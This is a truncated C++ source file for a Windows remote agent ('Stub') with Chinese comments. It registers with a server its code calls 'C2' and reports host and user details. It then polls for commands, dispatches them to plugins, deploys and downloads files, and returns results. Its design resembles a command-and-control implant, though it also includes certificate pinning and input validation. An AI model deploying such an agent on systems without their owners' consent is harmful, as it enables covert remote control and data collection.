#include "StubCore.h"
#include "Logger.h"
#include "NetworkFix.h"
#include "AntiHook.h"
#include <wininet.h>
#include <wincrypt.h>
#include <sstream>
#include <filesystem>
#include <algorithm>
#include <cctype>
#include <cstring>
#include <fstream>

#pragma comment(lib, "wininet.lib")
#pragma comment(lib, "crypt32.lib")
#pragma comment(lib, "advapi32.lib")

// ═══════════════════════════════════════════════
// Stub 核心 — TLS 加密网络客户端 + MCP 进程转发
// ═══════════════════════════════════════════════

// ── TLS 证书指纹固定（pinning）──
// 服务端启动日志会打印 "证书 SHA-256 指纹"（64 个 hex 字符）。
// 换用新服务器/重新生成证书时，将新指纹整串粘贴到下面常量并重新编译。
// 注意：直接粘贴 hex 字符串，运行时逐字符比对 ——
// 不要手工转成字节数组（历史上手抄错位导致全员连接失败）。
static const char* PINNED_CERT_SHA256_HEX =
    "5220c8c75495c81cbb7dea42b1ad6930848d6e6060bf21fb31cdfe683c2a49a0";

// 校验 hex 字符串格式合法且非全零
static bool IsPinConfigured() {
    if (strlen(PINNED_CERT_SHA256_HEX) != 64) return false;
    bool any = false;
    for (const char* p = PINNED_CERT_SHA256_HEX; *p; p++) {
        char c = *p;
        bool ok = (c >= '0' && c <= '9') || (c >= 'a' && c <= 'f') || (c >= 'A' && c <= 'F');
        if (!ok) return false;
        if (c != '0') any = true;
    }
    return any;
}

// 校验服务器证书 DER 编码的 SHA-256 是否与固定指纹一致
static bool VerifyServerCertPin(HINTERNET hReq) {
    if (!IsPinConfigured()) {
        LOG_E("TLS", "未配置 PINNED_CERT_SHA256 指纹，拒绝连接（请从服务端日志获取指纹并编译进客户端）");
        return false;
    }
    // 文档化接口：取服务器证书链（INTERNET_OPTION_SERVER_CERT_CHAIN_CONTEXT = 105）
    PCCERT_CHAIN_CONTEXT pChain = nullptr;
    DWORD sz = sizeof(pChain);
    if (!InternetQueryOptionA(hReq, INTERNET_OPTION_SERVER_CERT_CHAIN_CONTEXT, &pChain, &sz)
        || !pChain || pChain->cChain < 1 || !pChain->rgpChain[0]
        || pChain->rgpChain[0]->cElement < 1 || !pChain->rgpChain[0]->rgpElement[0]) {
        LOG_E("TLS", "无法获取服务器证书链");
        return false;
    }
    // 叶子证书（链首元素）即服务器本证书
    PCCERT_CONTEXT pCert = pChain->rgpChain[0]->rgpElement[0]->pCertContext;
    if (!pCert) {
        LOG_E("TLS", "证书链中无叶子证书");
        CertFreeCertificateChain(pChain);
        return false;
    }
    bool ok = false;
    HCRYPTPROV hProv = 0;
    HCRYPTHASH hHash = 0;
    if (CryptAcquireContextW(&hProv, nullptr, nullptr, PROV_RSA_AES, CRYPT_VERIFYCONTEXT)
        && CryptCreateHash(hProv, CALG_SHA_256, 0, 0, &hHash)
        && CryptHashData(hHash, pCert->pbCertEncoded, pCert->cbCertEncoded, 0)) {
        unsigned char digest[32];
        DWORD dlen = sizeof(digest);
        if (CryptGetHashParam(hHash, HP_HASHVAL, digest, &dlen, 0)) {
            // digest 转 hex 字符串后与 pin 字符串逐字符比对（杜绝手抄字节错位）
            char got[65];
            for (int i = 0; i < 32; i++) snprintf(got + i * 2, 3, "%02x", digest[i]);
            got[64] = 0;
            ok = (dlen == 32) && (strcmp(got, PINNED_CERT_SHA256_HEX) == 0);
            if (!ok) {
                LOG_E("TLS", ("证书指纹不匹配！got=" + std::string(got) + " want=" + std::string(PINNED_CERT_SHA256_HEX)).c_str());
            }
        }
    } else {
        LOG_E("TLS", "证书哈希计算失败");
    }
    if (hHash) CryptDestroyHash(hHash);
    if (hProv) CryptReleaseContext(hProv, 0);
    CertFreeCertificateChain(pChain); // 释放整链（pCert 由链持有，不能单独 Free）
    if (!ok) LOG_E("TLS", "证书指纹校验失败，断开连接（疑似中间人）");
    return ok;
}

// https 请求：放行自签 CA（信任由 pinning 把关，而非系统信任链）
static void SetupSelfSignedTls(HINTERNET hReq) {
    DWORD secFlags = SECURITY_FLAG_IGNORE_UNKNOWN_CA
                   | SECURITY_FLAG_IGNORE_CERT_CN_INVALID
                   | SECURITY_FLAG_IGNORE_CERT_DATE_INVALID;
    InternetSetOptionA(hReq, INTERNET_OPTION_SECURITY_FLAGS, &secFlags, sizeof(secFlags));
}

// 校验来自服务端的文件/目录名：白名单字符集，拒绝路径穿越与命令注入载荷
// 允许: 字母 数字 . _ - 空格 / \（目录分隔）
// 拒绝: 引号、分号、&、|、%、$、..、盘符冒号
static bool IsValidRemoteName(const std::string& name) {
    if (name.empty() || name.size() > 200) return false;
    if (name.find("..") != std::string::npos) return false;
    for (char c : name) {
        bool ok = (isalnum((unsigned char)c) || c == '.' || c == '_' || c == '-'
                   || c == '/' || c == '\\' || c == ' ');
        if (!ok) return false;
    }
    return true;
}

// ── 密钥内存卫生（方案1）──
// 存放：明文 key 与随机 mask 异或后保存，两成员长驻但均无明文特征
void StubCore::setAgentKeyPlain(const char* key) {
    if (!_agentKeyObf.empty()) SecureZeroMemory(&_agentKeyObf[0], _agentKeyObf.size());
    if (!_keyMask.empty()) SecureZeroMemory(&_keyMask[0], _keyMask.size());
    _agentKeyObf.clear();
    _keyMask.clear();
    if (!key || !*key) return;
    size_t len = strlen(key);
    _agentKeyObf.resize(len);
    _keyMask.resize(len);
    // 生成随机掩码（BCryptGenRandom 不可用则退化为简单熵源）
    HCRYPTPROV hProv = 0;
    bool haveCsp = CryptAcquireContextW(&hProv, nullptr, nullptr, PROV_RSA_AES, CRYPT_VERIFYCONTEXT) != 0;
    for (size_t i = 0; i < len; i++) {
        unsigned char r = 0;
        if (haveCsp) {
            BYTE b = 0;
            if (!CryptGenRandom(hProv, 1, &b)) b = (BYTE)(GetTickCount() ^ i);
            r = b;
        } else {
            r = (BYTE)(GetTickCount() ^ (i * 131));
        }
        _keyMask[i] = r;
        _agentKeyObf[i] = key[i] ^ r;
    }
    if (haveCsp) CryptReleaseContext(hProv, 0);
}

// 在栈上构造 "X-Agent-Key: <key>\r\n" + "X-Agent-HWID: <hwid>\r\n" 头，
// 用后由调用方 SecureZeroMemory。
// 返回的 std::string 内容即含明文——调用方必须在发送完成后立即 wipe。
static std::string BuildAgentKeyHeader(const std::string& obf, const std::string& mask,
                                       const std::string& hwid) {
    std::string hdr;
    if (obf.empty()) return hdr;
    hdr.reserve(obf.size() + hwid.size() + 48);
    hdr += "X-Agent-Key: ";
    for (size_t i = 0; i < obf.size(); i++) hdr += (char)(obf[i] ^ mask[i]);
    hdr += "\r\n";
    if (!hwid.empty()) hdr += "X-Agent-HWID: " + hwid + "\r\n";
    return hdr;
}

// 擦除 string 内容（先覆写再清空，防优化器把写操作消除）
static void WipeString(std::string& s) {
    if (!s.empty()) {
        SecureZeroMemory(&s[0], s.size());
    }
    s.clear();
}

StubCore::StubCore() {
    LOG_I("Stub", "Constructor start");
    // 配置优先级：命令行参数 > 环境变量 > exe 同目录 r6m.ini
    // r6m.ini 格式（UTF-8，无 BOM）：
    //   server=https://[v6地址]:8443
    //   agent_key=64位hex引导密钥
    _serverUrl = "https://[::1]:8080";

    // 1) 环境变量
    if (const char* s = getenv("R6M_SERVER")) _serverUrl = s;
    if (const char* k = getenv("R6M_AGENT_KEY")) setAgentKeyPlain(k);

    // 2) 配置文件兜底（仅当环境变量未设置时）
    if (getenv("R6M_SERVER") == nullptr || getenv("R6M_AGENT_KEY") == nullptr) {
        wchar_t exePath[MAX_PATH] = {};
        GetModuleFileNameW(nullptr, exePath, MAX_PATH);
        std::wstring ws(exePath);
        ws = ws.substr(0, ws.find_last_of(L'\\'));
        std::ifstream ini(ws + L"\\r6m.ini");
        if (ini.is_open()) {
            std::string line;
            while (std::getline(ini, line)) {
                // 去掉 \r 和首尾空格
                while (!line.empty() && (line.back() == '\r' || line.back() == ' ')) line.pop_back();
                auto eq = line.find('=');
                if (eq == std::string::npos) continue;
                std::string key = line.substr(0, eq), val = line.substr(eq + 1);
                if (key == "server" && getenv("R6M_SERVER") == nullptr && !val.empty()) {
                    _serverUrl = val;
                    LOG_I("Stub", "config: server loaded from r6m.ini");
                } else if (key == "agent_key" && !hasAgentKey() && !val.empty()) {
                    setAgentKeyPlain(val.c_str());
                    // 擦除栈上副本
                    SecureZeroMemory(&val[0], val.size());
                    LOG_I("Stub", "config: agent_key loaded from r6m.ini");
                }
            }
        }
    }

    LOG_I("Stub", "Setting up HTTP session...");
    _hSession = InternetOpenA("Mozilla/5.0", INTERNET_OPEN_TYPE_PRECONFIG, nullptr, nullptr, 0);
    if (_hSession) {
        LOG_I("Stub", "HTTP session OK");
    } else {
        LOG_E("Stub", "HTTP session FAILED");
    }
    if (!hasAgentKey()) {
        LOG_E("Stub", "未配置密钥（r6m.ini / R6M_AGENT_KEY / --agent-key 均未提供），服务端将拒绝本客户端");
    }
    LOG_I("Stub", "Constructor done");
}

StubCore::~StubCore() {
    _running = false;
    if (_heartbeatThread.joinable()) _heartbeatThread.join();
    if (_hSession) InternetCloseHandle(_hSession);
}

// ── HTTP ──

bool StubCore::httpPost(const std::string& path, const std::string& body, std::string& response) {
    std::string url = _serverUrl + path;
    LOG_D("HTTP", ("POST " + url).c_str());

    // Use HttpOpenRequest for better IPv6 support
    URL_COMPONENTS urlComp = {};
    urlComp.dwStructSize = sizeof(urlComp);
    urlComp.dwSchemeLength = 1;
    urlComp.dwHostNameLength = 1;
    urlComp.dwUrlPathLength = 1;
    urlComp.dwExtraInfoLength = 1;

    wchar_t wUrl[1024];
    MultiByteToWideChar(CP_UTF8, 0, url.c_str(), -1, wUrl, 1024);

    if (!InternetCrackUrlA(url.c_str(), (DWORD)url.size(), 0, &urlComp)) {
        LOG_E("HTTP", "URL parse failed");
        return false;
    }

    std::string host(urlComp.lpszHostName, urlComp.dwHostNameLength);
    std::string pathStr(urlComp.lpszUrlPath, urlComp.dwUrlPathLength);
    if (urlComp.dwExtraInfoLength > 0) {
        pathStr += std::string(urlComp.lpszExtraInfo, urlComp.dwExtraInfoLength);
    }
    int port = urlComp.nPort;
    bool isHttps = (urlComp.nScheme == INTERNET_SCHEME_HTTPS);

    LOG_D("HTTP", ("Host: " + host + " Port: " + std::to_string(port) + (isHttps ? " (TLS)" : "")).c_str());

    HINTERNET hConn = InternetConnectA(_hSession, host.c_str(), (INTERNET_PORT)port,
        nullptr, nullptr, INTERNET_SERVICE_HTTP, 0, 0);
    if (!hConn) {
        LOG_E("HTTP", "InternetConnect failed");
        return false;
    }

    DWORD reqFlags = INTERNET_FLAG_RELOAD | INTERNET_FLAG_NO_CACHE_WRITE | INTERNET_FLAG_NO_UI;
    if (isHttps) reqFlags |= INTERNET_FLAG_SECURE;

    HINTERNET hReq = HttpOpenRequestA(hConn, "POST", pathStr.c_str(), nullptr, nullptr,
        nullptr, reqFlags, 0);
    if (!hReq) {
        LOG_E("HTTP", "HttpOpenRequest failed");
        InternetCloseHandle(hConn);
        return false;
    }

    // 自签证书场景：信任由指纹固定（pinning）把关，而非系统信任链
    if (isHttps) SetupSelfSignedTls(hReq);

    // Set timeout (30 seconds)
    DWORD timeout = 30000;
    InternetSetOption(hReq, INTERNET_OPTION_RECEIVE_TIMEOUT, &timeout, sizeof(timeout));
    InternetSetOption(hReq, INTERNET_OPTION_SEND_TIMEOUT, &timeout, sizeof(timeout));

    std::string headers = "Content-Type: application/json\r\n";
    // 密钥头：栈上解码进 headers，发送完成后整串擦除（方案1+2）
    {
        std::string keyHdr = BuildAgentKeyHeader(_agentKeyObf, _keyMask, _hwid);
        headers += keyHdr;
        WipeString(keyHdr);
    }
    if (!HttpSendRequestA(hReq, headers.c_str(), (DWORD)headers.size(), (LPVOID)body.c_str(), (DWORD)body.size())) {
        LOG_E("HTTP", "HttpSendRequestA failed");
        WipeString(headers);
        InternetCloseHandle(hReq);
        InternetCloseHandle(hConn);
        return false;
    }
    WipeString(headers); // 含密钥明文，发送后立即擦

    // TLS 指纹校验：不匹配即断连，绝不降级
    if (isHttps && !VerifyServerCertPin(hReq)) {
        InternetCloseHandle(hReq);
        InternetCloseHandle(hConn);
        return false;
    }

    char buf[65536];
    DWORD bytesRead = 0;
    std::string result;
    while (InternetReadFile(hReq, buf, sizeof(buf) - 1, &bytesRead) && bytesRead > 0) {
        buf[bytesRead] = 0;
        result += buf;
    }
    InternetCloseHandle(hReq);
    InternetCloseHandle(hConn);
    response = result;
    LOG_D("HTTP", ("Response: " + result.substr(0, 100)).c_str());
    return true;
}

std::string StubCore::httpGet(const std::string& path) {
    std::string url = _serverUrl + path;

    // 与 httpPost 相同结构：需要先设安全标志再发请求，并在发送后校验指纹
    URL_COMPONENTS urlComp = {};
    urlComp.dwStructSize = sizeof(urlComp);
    urlComp.dwSchemeLength = 1;
    urlComp.dwHostNameLength = 1;
    urlComp.dwUrlPathLength = 1;
    urlComp.dwExtraInfoLength = 1;

    if (!InternetCrackUrlA(url.c_str(), (DWORD)url.size(), 0, &urlComp)) {
        LOG_E("HTTP", "URL parse failed");
        return "";
    }
    std::string host(urlComp.lpszHostName, urlComp.dwHostNameLength);
    std::string pathStr(urlComp.lpszUrlPath, urlComp.dwUrlPathLength);
    if (urlComp.dwExtraInfoLength > 0) {
        pathStr += std::string(urlComp.lpszExtraInfo, urlComp.dwExtraInfoLength);
    }
    int port = urlComp.nPort;
    bool isHttps = (urlComp.nScheme == INTERNET_SCHEME_HTTPS);

    HINTERNET hConn = InternetConnectA(_hSession, host.c_str(), (INTERNET_PORT)port,
        nullptr, nullptr, INTERNET_SERVICE_HTTP, 0, 0);
    if (!hConn) {
        LOG_E("HTTP", "InternetConnect failed");
        return "";
    }

    DWORD reqFlags = INTERNET_FLAG_RELOAD | INTERNET_FLAG_NO_CACHE_WRITE | INTERNET_FLAG_NO_UI;
    if (isHttps) reqFlags |= INTERNET_FLAG_SECURE;

    HINTERNET hReq = HttpOpenRequestA(hConn, "GET", pathStr.c_str(), nullptr, nullptr,
        nullptr, reqFlags, 0);
    if (!hReq) {
        LOG_E("HTTP", "HttpOpenRequest failed");
        InternetCloseHandle(hConn);
        return "";
    }

    if (isHttps) SetupSelfSignedTls(hReq);

    DWORD timeout = 30000;
    InternetSetOptionA(hReq, INTERNET_OPTION_RECEIVE_TIMEOUT, &timeout, sizeof(timeout));
    InternetSetOptionA(hReq, INTERNET_OPTION_SEND_TIMEOUT, &timeout, sizeof(timeout));

    std::string headers = BuildAgentKeyHeader(_agentKeyObf, _keyMask, _hwid);
    if (!HttpSendRequestA(hReq, headers.empty() ? nullptr : headers.c_str(),
        (DWORD)headers.size(), nullptr, 0)) {
        LOG_E("HTTP", "HttpSendRequestA failed");
        WipeString(headers);
        InternetCloseHandle(hReq);
        InternetCloseHandle(hConn);
        return "";
    }
    WipeString(headers); // 含密钥明文，发送后立即擦

    if (isHttps && !VerifyServerCertPin(hReq)) {
        InternetCloseHandle(hReq);
        InternetCloseHandle(hConn);
        return "";
    }

    char buf[65536];
    DWORD bytesRead = 0;
    std::string result;
    while (InternetReadFile(hReq, buf, sizeof(buf) - 1, &bytesRead) && bytesRead > 0) {
        buf[bytesRead] = 0;
        result += buf;
    }
    InternetCloseHandle(hReq);
    InternetCloseHandle(hConn);
    return result;
}

// ── 主循环 ──

void StubCore::run(const std::wstring& pluginDir) {
    _running = true;
    LOG_INFO("Stub", "=== START ===");

    // Parse command line
    int argc = 0;
    LPWSTR* argv = CommandLineToArgvW(GetCommandLineW(), &argc);
    for (int i = 1; i < argc; i++) {
        if (std::wstring(argv[i]) == L"--server" && i + 1 < argc) {
            std::wstring ws(argv[i + 1]);
            _serverUrl = std::string(ws.begin(), ws.end());
        }
        if (std::wstring(argv[i]) == L"--agent-key" && i + 1 < argc) {
            std::wstring ws(argv[i + 1]);
            setAgentKeyPlain(std::string(ws.begin(), ws.end()).c_str());
        }
    }
    if (argv) LocalFree(argv);
    if (_serverUrl.rfind("http://", 0) == 0) {
        LOG_E("Stub", "拒绝使用明文 http:// 服务器地址 —— 请改用 https://（不降级）");
    }
    LOG_INFO("Stub", ("URL=" + _serverUrl).c_str());

    LOG_INFO("Stub", "A: Network fix");
    NetworkFix::FixAll(_serverUrl);
    LOG_INFO("Stub", "B: Network done");

    LOG_INFO("Stub", "C: HWID");
    _hwid = generateHWID();
    LOG_INFO("Stub", ("HWID=" + _hwid).c_str());

    // 注意：插件/Python 同步必须在注册之后（D' 步）——
    // per-agent 密钥模型下，注册前只有引导密钥，下载接口会 401。

    // 连接前验证 C2 可达，最多重试 3 次，指数退避
    LOG_INFO("Stub", "E: Verify C2 reachable");
    for (int attempt = 1; attempt <= 3; ++attempt) {
        if (NetworkFix::VerifyC2Reachable(_serverUrl)) {
            LOG_INFO("Stub", ("C2 reachable on attempt " + std::to_string(attempt)).c_str());
            break;
        }
        LOG_WARN("Stub", ("C2 unreachable, attempt " + std::to_string(attempt) + "/3, waiting...").c_str());
        std::this_thread::sleep_for(std::chrono::seconds(attempt * 5));
    }

    // AntiHook 基线检查（三段式之一：检测）—— 连接前体检一次
    {
        std::vector<ApiIntegrityReport> reports;
        LOG_INFO("Stub", "H: AntiHook baseline check");
        if (AntiHook::CheckCriticalApis(reports)) {
            LOG_INFO("Stub", "AntiHook baseline: all critical APIs intact");
        } else {
            _integrityCompromised = true;
            LOG_E("Stub", "AntiHook baseline: 检测到篡改，进入熔断状态（详见 AntiHook 日志）");
        }
        AntiHook::LogReports(reports);
    }

    LOG_INFO("Stub", "F: Connect");
    for (int attempt = 1; attempt <= 5; ++attempt) {
        if (connectToServer()) break;
        LOG_WARN("Stub", ("Connect failed, attempt " + std::to_string(attempt) + "/5, retry in " + std::to_string(attempt * 3) + "s").c_str());
        std::this_thread::sleep_for(std::chrono::seconds(attempt * 3));
    }

    // D': 插件同步 —— 必须在注册之后：此时已换成本机独立密钥，
    // 下载接口（/api/runtime、/api/plugins*）才会放行
    LOG_INFO("Stub", "D': Plugins (after register)");
    syncPlugins(pluginDir);       // 从服务端同步缺失的插件 + 嵌入式 Python

    // 设置嵌入式 Python 路径
    {
        wchar_t ep[MAX_PATH] = {};
        GetModuleFileNameW(nullptr, ep, MAX_PATH);
        std::wstring ws(ep); ws = ws.substr(0, ws.find_last_of(L'\\'));
        std::wstring py = ws + L"\\runtime\\python.exe";
        if (GetFileAttributesW(py.c_str()) != INVALID_FILE_ATTRIBUTES) {
            _plugins.setPythonPath(py);
            LOG_INFO("Stub", "Embedded Python found");
        }
    }

    _plugins.scanPlugins(pluginDir);
    _plugins.buildToolMap();

    LOG_INFO("Stub", "F: Heartbeat thread");
    _heartbeatThread = std::thread([this]() {
        while (_running) {
            std::this_thread::sleep_for(std::chrono::seconds(5));
            try {
                // 心跳携带完整性状态（三段式之二：上报）
                std::string integrity = AntiHook::SummaryForHeartbeat();
                if (integrity != "ok") {
                    _integrityCompromised = true; // 三段式之三：置熔断标志
                }
                std::string body = "{\"hwid\":\"" + _hwid + "\",\"integrity\":\"" + integrity + "\"}";
                std::string resp;
                httpPost("/api/heartbeat", body, resp);
            } catch (...) {}
        }
    });
    LOG_INFO("Stub", "G: Poll loop");
    pollLoop();
    _running = false;
    _plugins.stopAll();
    LOG_INFO("Stub", "====== RemoteClient 退出 ======");
}

bool StubCore::connectToServer() {
    LOG_INFO("Stub", ("连接: " + _serverUrl).c_str());
    std::string info = collectSystemInfo();
    std::string body = "{\"hwid\":\"" + _hwid + "\",\"info\":" + info + "}";
    std::string resp;
    if (httpPost("/api/agent/register", body, resp)) {
        LOG_INFO("Stub", "连接成功");
        // per-agent 密钥：注册响应里下发本机独立密钥，热替换内存中的密钥。
        // 之后所有请求自动使用新密钥（心跳/poll/result/下载）。
        auto kp = resp.find("\"agent_key\"");
        if (kp != std::string::npos) {
            auto colon = resp.find(':', kp);
            auto q1 = resp.find('"', colon + 1);
            auto q2 = resp.find('"', q1 + 1);
            if (q1 != std::string::npos && q2 != std::string::npos && q2 > q1 + 1) {
                std::string newKey = resp.substr(q1 + 1, q2 - q1 - 1);
                setAgentKeyPlain(newKey.c_str());
                // 擦除响应副本（含密钥明文）
                SecureZeroMemory(&newKey[0], newKey.size());
                newKey.clear();
                WipeString(resp);
                LOG_INFO("Stub", "已切换为本机独立密钥（per-agent key）");
            }
        }
        return true;
    }
    return false;
}

void StubCore::pollLoop() {
    LOG_INFO("Stub", "开始轮询...");
    while (_running) {
        std::this_thread::sleep_for(std::chrono::seconds(3));
        // 三段式之三：熔断 —— 关键 API 被篡改期间不拉取/执行新指令。
        // 心跳线程仍在运行并持续上报完整性状态，等待人工确认恢复。
        if (_integrityCompromised) {
            LOG_E("Stub", "完整性熔断中：关键 API 疑似被篡改，暂停指令执行（心跳仍在上报）");
            std::this_thread::sleep_for(std::chrono::seconds(30));
            continue;
        }
        try {
            std::string body = "{\"hwid\":\"" + _hwid + "\"}";
            std::string resp;
            if (!httpPost("/api/agent/poll", body, resp)) continue;
            if (resp.empty() || resp == "{}" || resp == "null") continue;

            // Parse method from JSON response
            std::string method;
            auto mp = resp.find("\"method\"");
            if (mp != std::string::npos) {
                auto colon = resp.find(':', mp);
                auto q1 = resp.find('"', colon + 1);
                auto q2 = resp.find('"', q1 + 1);
                if (q1 != std::string::npos && q2 != std::string::npos)
                    method = resp.substr(q1 + 1, q2 - q1 - 1);
            }
            if (method.empty()) continue;

            // Extract params (simple brace matching)
            std::string params = "{}";
            auto pp = resp.find("\"params\"");
            if (pp != std::string::npos) {
                auto pc = resp.find(':', pp);
                auto pb = resp.find('{', pc);
                if (pb != std::string::npos) {
                    int depth = 1; size_t pe = pb + 1;
                    while (depth > 0 && pe < resp.size()) {
                        if (resp[pe] == '{') depth++;
                        else if (resp[pe] == '}') depth--;
                        pe++;
                    }
                    params = resp.substr(pb, pe - pb);
                }
            }
            if (method.empty()) continue;

            LOG_INFO("Stub", ("指令: " + method).c_str());

            // 解析 request_id（服务端新增）
            std::string requestId;
            auto rid = resp.find("\"request_id\"");
            if (rid != std::string::npos) {
                auto colon = resp.find(':', rid);
                auto q1 = resp.find('"', colon + 1);
                auto q2 = resp.find('"', q1 + 1);
                if (q1 != std::string::npos && q2 != std::string::npos)
                    requestId = resp.substr(q1 + 1, q2 - q1 - 1);
            }

            // 解析插件 ID：tools/call 时从工具映射表查插件，其他方法取前缀
            std::string pluginId;
            if (method == "tools/call") {
                auto np = params.find("\"name\"");
                std::string toolName;
                if (np != std::string::npos) {
                    auto colon = params.find(':', np);
                    auto q1 = params.find('"', colon + 1);
                    auto q2 = params.find('"', q1 + 1);
                    if (q1 != std::string::npos && q2 != std::string::npos)
                        toolName = params.substr(q1 + 1, q2 - q1 - 1);
                }
                pluginId = _plugins.resolvePluginForTool(toolName);
                if (pluginId.empty()) {
                    LOG_WARN("Stub", ("未找到处理工具 '" + toolName + "' 的插件").c_str());
                    continue;
                }
            } else {
                pluginId = method.substr(0, method.find('.'));
            }

            // 处理 deploy_file 指令
            if (method == "deploy_file") {
                LOG_INFO("Stub", "收到文件部署指令");
                handleDeployFile(params);
                // 回传部署结果
                if (!requestId.empty()) {
                    std::string postBody = "{\"request_id\":\"" + requestId + "\",\"result\":{\"ok\":true}}";
                    std::string resp2;
                    httpPost("/api/agent/result", postBody, resp2);
                    WipeString(postBody); WipeString(resp2);
                }
                WipeString(resp);
                continue;
            }

            // 分发给 MCP 插件
            std::string result = _plugins.callPlugin(pluginId, method, params);
            LOG_DEBUG("Stub", ("插件响应: " + result.substr(0, 200)).c_str());

            // 回传结果（仅 tools/call 需要）
            if (!requestId.empty() && method == "tools/call") {
                std::string postBody = "{\"request_id\":\"" + requestId + "\",\"result\":" + result + "}";
                std::string resp2;
                httpPost("/api/agent/result", postBody, resp2);
                LOG_DEBUG("Stub", ("结果回传: " + resp2).c_str());
                WipeString(postBody); WipeString(resp2);
            }
            // 方案2：插件输出可能含敏感数据（文件内容/命令输出），用后擦除
            WipeString(result);
            WipeString(resp);

        } catch (const std::exception& e) {
            LOG_ERROR("Stub", ("轮询异常: " + std::string(e.what())).c_str());
        } catch (...) {
            LOG_ERROR("Stub", "轮询异常");
        }
    }
}

std::string StubCore::collectSystemInfo() {
    wchar_t computer[MAX_PATH] = {}; DWORD csz = MAX_PATH;
    GetComputerNameW(computer, &csz);
    wchar_t user[MAX_PATH] = {}; DWORD usz = MAX_PATH;
    GetUserNameW(user, &usz);

    typedef NTSTATUS(WINAPI* RtlGetVersionPtr)(PRTL_OSVERSIONINFOW);
    auto fn = (RtlGetVersionPtr)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlGetVersion");
    DWORD build = 0;
    if (fn) {
        RTL_OSVERSIONINFOW rovi = { sizeof(rovi) };
        fn(&rovi);
        build = rovi.dwBuildNumber;
    }

    // Convert wide strings to UTF-8
    char cs[256] = {}, us[256] = {};
    WideCharToMultiByte(CP_UTF8, 0, computer, -1, cs, sizeof(cs), nullptr, nullptr);
    WideCharToMultiByte(CP_UTF8, 0, user, -1, us, sizeof(us), nullptr, nullptr);
    std::ostringstream ss;
    ss << "{\"computer\":\"" << cs
       << "\",\"user\":\"" << us
       << "\",\"os\":\"Win10 Build " << build
       << "\",\"arch\":\"" << (sizeof(void*) == 8 ? "x64" : "x86") << "\"}";
    return ss.str();
}

std::string StubCore::generateHWID() {
    // 基于 MAC + 计算机名生成稳定 HWID
    wchar_t computer[MAX_PATH] = {}; DWORD sz = MAX_PATH;
    GetComputerNameW(computer, &sz);
    std::wstring ws(computer);
    std::string s(ws.begin(), ws.end());
    // 简单哈希
    unsigned int hash = 5381;
    for (char c : s) hash = ((hash << 5) + hash) + c;
    char buf[32];
    snprintf(buf, sizeof(buf), "%08X", hash);
    return std::string(buf);
}

// ═══════════════════════════════════════════════
// 文件下载 & 部署
// ═══════════════════════════════════════════════

bool StubCore::httpDownload(const std::string& url, const std::wstring& savePath) {
    std::string savePathUtf8(savePath.begin(), savePath.end());
    LOG_I("Download", ("开始下载: " + url).c_str());
    LOG_I("Download", ("保存到: " + savePathUtf8).c_str());

    // 解析 URL
    URL_COMPONENTS urlComp = {};
    urlComp.dwStructSize = sizeof(urlComp);
    urlComp.dwSchemeLength = 1;
    urlComp.dwHostNameLength = 1;
    urlComp.dwUrlPathLength = 1;
    urlComp.dwExtraInfoLength = 1;

    if (!InternetCrackUrlA(url.c_str(), (DWORD)url.size(), 0, &urlComp)) {
        LOG_E("Download", ("URL 解析失败, error=" + std::to_string(GetLastError())).c_str());
        return false;
    }

    std::string host(urlComp.lpszHostName, urlComp.dwHostNameLength);
    std::string pathStr(urlComp.lpszUrlPath, urlComp.dwUrlPathLength);
    if (urlComp.dwExtraInfoLength > 0) {
        pathStr += std::string(urlComp.lpszExtraInfo, urlComp.dwExtraInfoLength);
    }
    int port = urlComp.nPort;
    bool isHttps = (urlComp.nScheme == INTERNET_SCHEME_HTTPS);

    LOG_I("Download", ("Host: " + host + " Path: " + pathStr).c_str());

    HINTERNET hConn = InternetConnectA(_hSession, host.c_str(), (INTERNET_PORT)port,
        nullptr, nullptr, INTERNET_SERVICE_HTTP, 0, 0);
    if (!hConn) {
        LOG_E("Download", ("连接失败: " + host + " error=" + std::to_string(GetLastError())).c_str());
        return false;
    }

    DWORD reqFlags = INTERNET_FLAG_RELOAD | INTERNET_FLAG_NO_CACHE_WRITE | INTERNET_FLAG_NO_UI;
    if (isHttps) reqFlags |= INTERNET_FLAG_SECURE;

    HINTERNET hReq = HttpOpenRequestA(hConn, "GET", pathStr.c_str(), nullptr, nullptr,
        nullptr, reqFlags, 0);
    if (!hReq) {
        LOG_E("Download", ("请求失败: error=" + std::to_string(GetLastError())).c_str());
        InternetCloseHandle(hConn);
        return false;
    }

    if (isHttps) SetupSelfSignedTls(hReq);

    DWORD timeout = 120000; // 2 分钟超时
    InternetSetOption(hReq, INTERNET_OPTION_RECEIVE_TIMEOUT, &timeout, sizeof(timeout));
    InternetSetOption(hReq, INTERNET_OPTION_SEND_TIMEOUT, &timeout, sizeof(timeout));

    std::string headers = BuildAgentKeyHeader(_agentKeyObf, _keyMask, _hwid);
    if (!HttpSendRequestA(hReq, headers.empty() ? nullptr : headers.c_str(),
        (DWORD)headers.size(), nullptr, 0)) {
        LOG_E("Download", "发送失败");
        WipeString(headers);
        InternetCloseHandle(hReq);
        InternetCloseHandle(hConn);
        return false;
    }
    WipeString(headers); // 含密钥明文，发送后立即擦

    if (isHttps && !VerifyServerCertPin(hReq)) {
        InternetCloseHandle(hReq);
        InternetCloseHandle(hConn);
        return false;
    }

    // 检查状态码
    DWORD statusCode = 0;
    DWORD statusSize = sizeof(statusCode);
    HttpQueryInfoA(hReq, HTTP_QUERY_STATUS_CODE | HTTP_QUERY_FLAG_NUMBER, &statusCode, &statusSize, nullptr);
    if (statusCode != 200) {
        LOG_E("Download", ("HTTP 状态码: " + std::to_string(statusCode)).c_str());
        InternetCloseHandle(hReq);
        InternetCloseHandle(hConn);
        return false;
    }

    // 获取文件大小
    DWORD contentLength = 0;
    DWORD clSize = sizeof(contentLength);
    HttpQueryInfoA(hReq, HTTP_QUERY_CONTENT_LENGTH | HTTP_QUERY_FLAG_NUMBER, &contentLength, &clSize, nullptr);

    // 打开本地文件（用 CreateFileW 支持中文路径）
    HANDLE hFile = CreateFileW(savePath.c_str(), GENERIC_WRITE, 0, nullptr,
        CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, nullptr);
    if (hFile == INVALID_HANDLE_VALUE) {
        LOG_E("Download", ("无法创建文件, error=" + std::to_string(GetLastError())).c_str());
        InternetCloseHandle(hReq);
        InternetCloseHandle(hConn);
        return false;
    }

    // 下载
    char buf[65536];
    DWORD totalRead = 0;
    DWORD bytesRead = 0;
    while (InternetReadFile(hReq, buf, sizeof(buf) - 1, &bytesRead) && bytesRead > 0) {
        DWORD written = 0;
        WriteFile(hFile, buf, bytesRead, &written, nullptr);
        totalRead += bytesRead;
        if (contentLength > 0) {
